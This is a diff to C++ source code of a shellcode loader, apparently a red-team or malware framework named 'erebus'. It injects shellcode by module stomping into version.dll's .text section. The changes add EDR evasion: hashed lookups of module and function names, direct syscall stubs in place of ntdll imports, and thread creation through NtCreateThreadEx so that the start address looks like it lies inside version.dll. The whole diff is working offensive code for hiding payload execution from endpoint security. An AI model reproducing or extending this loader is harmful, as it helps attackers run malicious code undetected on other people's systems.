@@ -19,6 +19,7 @@
 //   EDR's integrity module.
 
 #include "../../include/loader.hpp"
+#include "../../include/evasion/syscall_backend.hpp"
 
 namespace erebus {
 #if CONFIG_INJECTION_TYPE == 6
@@ -27,18 +28,52 @@ namespace erebus {
 	{
 		LOG_INFO("Injection via Module Stomping (version.dll .text overwrite)");
 
-		HMODULE ntdll = ImportModule("ntdll.dll");
+		HMODULE ntdll = erebus::GetModuleHandleC(H("ntdll.dll"));
 		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
 
-		ImportFunction(ntdll, NtCreateFile,           typeNtCreateFile);
-		ImportFunction(ntdll, NtCreateSection,        typeNtCreateSection);
-		ImportFunction(ntdll, NtMapViewOfSection,     typeNtMapViewOfSection);
-		ImportFunction(ntdll, NtUnmapViewOfSection,   typeNtUnmapViewOfSection);
-		ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
-		ImportFunction(ntdll, NtClose,                typeNtClose);
+		typeNtCreateFile NtCreateFile =
+			(typeNtCreateFile)erebus::evasion::GetSyscallStub(H("NtCreateFile"));
+		if (!NtCreateFile)
+			NtCreateFile = (typeNtCreateFile)erebus::GetProcAddressC(ntdll, H("NtCreateFile"));
+
+		typeNtCreateSection NtCreateSection =
+			(typeNtCreateSection)erebus::evasion::GetSyscallStub(H("NtCreateSection"));
+		if (!NtCreateSection)
+			NtCreateSection = (typeNtCreateSection)erebus::GetProcAddressC(ntdll, H("NtCreateSection"));
+
+		typeNtMapViewOfSection NtMapViewOfSection =
+			(typeNtMapViewOfSection)erebus::evasion::GetSyscallStub(H("NtMapViewOfSection"));
+		if (!NtMapViewOfSection)
+			NtMapViewOfSection = (typeNtMapViewOfSection)erebus::GetProcAddressC(ntdll, H("NtMapViewOfSection"));
+
+		typeNtUnmapViewOfSection NtUnmapViewOfSection =
+			(typeNtUnmapViewOfSection)erebus::evasion::GetSyscallStub(H("NtUnmapViewOfSection"));
+		if (!NtUnmapViewOfSection)
+			NtUnmapViewOfSection = (typeNtUnmapViewOfSection)erebus::GetProcAddressC(ntdll, H("NtUnmapViewOfSection"));
+
+		typeNtProtectVirtualMemory NtProtectVirtualMemory =
+			(typeNtProtectVirtualMemory)erebus::evasion::GetSyscallStub(H("NtProtectVirtualMemory"));
+		if (!NtProtectVirtualMemory)
+			NtProtectVirtualMemory = (typeNtProtectVirtualMemory)erebus::GetProcAddressC(ntdll, H("NtProtectVirtualMemory"));
+
+		typeNtClose NtClose =
+			(typeNtClose)erebus::evasion::GetSyscallStub(H("NtClose"));
+		if (!NtClose)
+			NtClose = (typeNtClose)erebus::GetProcAddressC(ntdll, H("NtClose"));
+
+		typeNtCreateThreadEx NtCreateThreadEx =
+			(typeNtCreateThreadEx)erebus::evasion::GetSyscallStub(H("NtCreateThreadEx"));
+		if (!NtCreateThreadEx)
+			NtCreateThreadEx = (typeNtCreateThreadEx)erebus::GetProcAddressC(ntdll, H("NtCreateThreadEx"));
+
+		typeNtWaitForSingleObject NtWaitForSingleObject =
+			(typeNtWaitForSingleObject)erebus::evasion::GetSyscallStub(H("NtWaitForSingleObject"));
+		if (!NtWaitForSingleObject)
+			NtWaitForSingleObject = (typeNtWaitForSingleObject)erebus::GetProcAddressC(ntdll, H("NtWaitForSingleObject"));
 
 		if (!NtCreateFile || !NtCreateSection || !NtMapViewOfSection ||
-		    !NtUnmapViewOfSection || !NtProtectVirtualMemory || !NtClose)
+		    !NtUnmapViewOfSection || !NtProtectVirtualMemory || !NtClose ||
+		    !NtCreateThreadEx || !NtWaitForSingleObject)
 		{
 			LOG_ERROR("Failed to resolve one or more NT functions");
 			return;
@@ -217,21 +252,24 @@ namespace erebus {
 
 		LOG_SUCCESS("Shellcode written and .text re-protected RX");
 
-		// CreateThread with the start address inside the DLL mapping - the
+		// NtCreateThreadEx with the start address inside the DLL mapping - the
 		// thread's start routine appears to reside in version.dll from the
 		// kernel's perspective.
-		HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)text_va, NULL, 0, NULL);
-		if (!thread) {
-			LOG_ERROR("CreateThread failed (Code: 0x%08lX)", GetLastError());
-			NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, mapped_base);
+		HANDLE thread = NULL;
+		NTSTATUS thr_st = NtCreateThreadEx(
+			&thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(),
+			(PVOID)text_va, NULL, 0, 0, 0, 0, NULL);
+		if (!NT_SUCCESS(thr_st) || !thread) {
+			LOG_ERROR("NtCreateThreadEx failed (NTSTATUS: 0x%08lX)", thr_st);
+			NtUnmapViewOfSection(NtCurrentProcess(), mapped_base);
 			NtClose(section_handle);
 			return;
 		}
 
 		LOG_SUCCESS("Thread created at stomped .text: 0x%p", text_va);
 
-		WaitForSingleObject(thread, INFINITE);
-		CloseHandle(thread);
+		NtWaitForSingleObject(thread, FALSE, NULL);
+		NtClose(thread);
 
 		// Unmap before closing the section - unmap order matters on some
 		// Windows versions; closing the section first can leave a dangling VAD.
